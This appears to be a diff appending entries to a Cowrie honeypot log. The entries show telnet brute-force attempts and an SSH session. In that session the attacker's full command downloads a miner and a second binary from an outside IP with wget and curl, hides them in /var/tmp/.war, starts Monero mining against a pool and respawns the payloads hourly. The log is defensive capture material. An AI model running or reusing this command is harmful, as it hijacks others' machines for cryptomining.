@@ -907,3 +907,102 @@
 2017-03-22T03:06:59+0000 [CowrieTelnetTransport,104988,67.229.141.98] login return, expect: [root/666666]
 2017-03-22T03:07:00+0000 [CowrieTelnetTransport,104988,67.229.141.98] login attempt [enable/shell] failed
 2017-03-22T03:07:00+0000 [CowrieTelnetTransport,104988,67.229.141.98] Warning: state changed and new state returned
+2017-03-22T03:07:01+0000 [CowrieTelnetTransport,104988,67.229.141.98] login attempt: 155642
+2017-03-22T03:07:01+0000 [CowrieTelnetTransport,104988,67.229.141.98] login return, expect: [root/666666]
+2017-03-22T03:07:03+0000 [CowrieTelnetTransport,104988,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-22T03:07:03+0000 [CowrieTelnetTransport,104988,67.229.141.98] Warning: state changed and new state returned
+2017-03-22T03:07:08+0000 [-] Process ended. Telnet Session disconnected
+2017-03-22T03:07:08+0000 [CowrieTelnetTransport,104983,183.167.193.77] Closing TTY Log: log/tty/20170322-030405-None-104983i.log after 182 seconds
+2017-03-22T03:07:08+0000 [CowrieTelnetTransport,104983,183.167.193.77] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-22T03:07:08+0000 [CowrieTelnetTransport,104983,183.167.193.77] Connection lost after 187 seconds
+2017-03-22T03:07:13+0000 [CowrieTelnetTransport,104986,67.229.141.98] Connection lost after 43 seconds
+2017-03-22T03:07:17+0000 [CowrieTelnetTransport,104987,67.229.141.98] Connection lost after 47 seconds
+2017-03-22T03:07:34+0000 [CowrieTelnetTransport,104988,67.229.141.98] Connection lost after 42 seconds
+2017-03-22T03:07:46+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 93.174.95.38:53756 (10.8.41.81:2223) [session: TT104989]
+2017-03-22T03:07:53+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 137.74.112.217:33294 (10.8.41.81:2222) [session: 27d72294]
+2017-03-22T03:07:53+0000 [HoneyPotSSHTransport,43316,137.74.112.217] Remote SSH version: SSH-2.0-libssh-0.2
+2017-03-22T03:07:53+0000 [HoneyPotSSHTransport,43316,137.74.112.217] kex alg, key alg: 'ecdh-sha2-nistp256' 'ssh-rsa'
+2017-03-22T03:07:53+0000 [HoneyPotSSHTransport,43316,137.74.112.217] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-22T03:07:53+0000 [HoneyPotSSHTransport,43316,137.74.112.217] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-22T03:07:53+0000 [HoneyPotSSHTransport,43316,137.74.112.217] NEW KEYS
+2017-03-22T03:07:53+0000 [HoneyPotSSHTransport,43316,137.74.112.217] starting service 'ssh-userauth'
+2017-03-22T03:07:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43316,137.74.112.217] 'oracle' trying auth 'none'
+2017-03-22T03:07:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43316,137.74.112.217] 'oracle' authenticated with 'none'
+2017-03-22T03:07:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43316,137.74.112.217] starting service 'ssh-connection'
+2017-03-22T03:07:55+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] got channel 'session' request
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] channel open
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] executing command "unset plm; plm=`ps x |grep stratum|grep -v grep| cut -d 's' -f 2`; if [ -e $plm ] ; then mkdir /var/tmp/.war;wget http://95.128.182.166/javascripts/minerd -O /var/tmp/.war/1;curl -o /var/tmp/.war/1 http://95.128.182.166/javascripts/minerd;chmod +x /var/tmp/.war/1 ; (exec /var/tmp/.war/1 -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u zaxa2aq@protonmail.com -p x &> /dev/null &);wget http://95.128.182.166/javascripts/4 -O /var/tmp/.war/4;curl -o /var/tmp/.war/4 http://95.128.182.166/javascripts/4;chmod +x /var/tmp/.war/4; cp /var/tmp/.war/4 /var/tmp/.war/6;(exec /var/tmp/.war/4 &> /dev/null &) ; (while [ 1 ]; do killall 4; killall 5 ; cp /var/tmp/.war/6 /var/tmp/.war/5;chmod +x /var/tmp/.war/5;(exec /var/tmp/.war/5 &> /dev/null &); sleep 3600 ;done &) ; else echo; fi;"
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Opening TTY Log: log/tty/20170322-030755-27d72294-0e.log
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] CMD: unset plm; plm=`ps x |grep stratum|grep -v grep| cut -d 's' -f 2`; if [ -e $plm ] ; then mkdir /var/tmp/.war;wget http://95.128.182.166/javascripts/minerd -O /var/tmp/.war/1;curl -o /var/tmp/.war/1 http://95.128.182.166/javascripts/minerd;chmod +x /var/tmp/.war/1 ; (exec /var/tmp/.war/1 -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u zaxa2aq@protonmail.com -p x &> /dev/null &);wget http://95.128.182.166/javascripts/4 -O /var/tmp/.war/4;curl -o /var/tmp/.war/4 http://95.128.182.166/javascripts/4;chmod +x /var/tmp/.war/4; cp /var/tmp/.war/4 /var/tmp/.war/6;(exec /var/tmp/.war/4 &> /dev/null &) ; (while [ 1 ]; do killall 4; killall 5 ; cp /var/tmp/.war/6 /var/tmp/.war/5;chmod +x /var/tmp/.war/5;(exec /var/tmp/.war/5 &> /dev/null &); sleep 3600 ;done &) ; else echo; fi;
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Command found: unset plm
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Command not found: plm= ` ps x | grep stratum | grep -v grep | cut -d 's' -f 2 `
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Command not found: if [ -e ]
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Command not found: then mkdir /var/tmp/.war
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Command found: wget http://95.128.182.166/javascripts/minerd -O /var/tmp/.war/1
+2017-03-22T03:07:55+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://95.128.182.166/javascripts/minerd>
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Command found: grep -v grep
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Command found: grep stratum
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Command not found: plm= ` ps x | grep stratum | grep -v grep | cut -d 's' -f 2 `
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Command found: curl -o /var/tmp/.war/1 http://95.128.182.166/javascripts/minerd
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Unhandled Error
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/log.py", line 86, in callWithContext
+	    return context.call({ILogContext: newCtx}, func, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/context.py", line 122, in callWithContext
+	    return self.currentContext().callWithContext(ctx, func, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/context.py", line 85, in callWithContext
+	    return func(*args,**kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/channel.py", line 162, in requestReceived
+	    return f(data)
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/session.py", line 73, in request_exec
+	    self.session.execCommand(pp, f)
+	  File "/home/cowrie/cowrie/cowrie/ssh/session.py", line 144, in execCommand
+	    self.protocol.makeConnection(processprotocol)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/protocol.py", line 494, in makeConnection
+	    self.connectionMade()
+	  File "/home/cowrie/cowrie/cowrie/insults/insults.py", line 78, in connectionMade
+	    insults.ServerProtocol.connectionMade(self)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/insults/insults.py", line 528, in connectionMade
+	    self.terminalProtocol.makeConnection(self)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/insults/insults.py", line 65, in makeConnection
+	    self.connectionMade()
+	  File "/home/cowrie/cowrie/cowrie/core/protocol.py", line 235, in connectionMade
+	    self.cmdstack[0].lineReceived(self.execcmd)
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 246, in lineReceived
+	    self.runCommand()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 353, in runCommand
+	    self.protocol.call_command(pp, cmdclass, *cmd_array[0]['rargs'])
+	  File "/home/cowrie/cowrie/cowrie/core/protocol.py", line 197, in call_command
+	    obj.start()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 109, in start
+	    self.exit()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 125, in exit
+	    self.protocol.cmdstack[-1].resume()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 361, in resume
+	    self.runCommand()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 353, in runCommand
+	    self.protocol.call_command(pp, cmdclass, *cmd_array[0]['rargs'])
+	  File "/home/cowrie/cowrie/cowrie/core/protocol.py", line 194, in call_command
+	    obj = cmd(self, *args)
+	exceptions.TypeError: 'NoneType' object is not callable
+	
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] Closing TTY Log: log/tty/20170322-030755-27d72294-0e.log after 0 seconds
+2017-03-22T03:07:55+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43316,137.74.112.217] honeypot terminal protocol connection lost disconnected
+2017-03-22T03:07:55+0000 [HoneyPotSSHTransport,43316,137.74.112.217] avatar oracle logging out
+2017-03-22T03:07:55+0000 [HoneyPotSSHTransport,43316,137.74.112.217] connection lost
+2017-03-22T03:07:55+0000 [HoneyPotSSHTransport,43316,137.74.112.217] Connection lost after 1 seconds
+2017-03-22T03:07:55+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:55+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:55+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:55+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:56+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:56+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:56+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:56+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:56+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:57+0000 [HTTPPageDownloader,client] Not storing duplicate content 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017
+2017-03-22T03:07:57+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:57+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-22T03:07:57+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://95.128.182.166/javascripts/minerd>
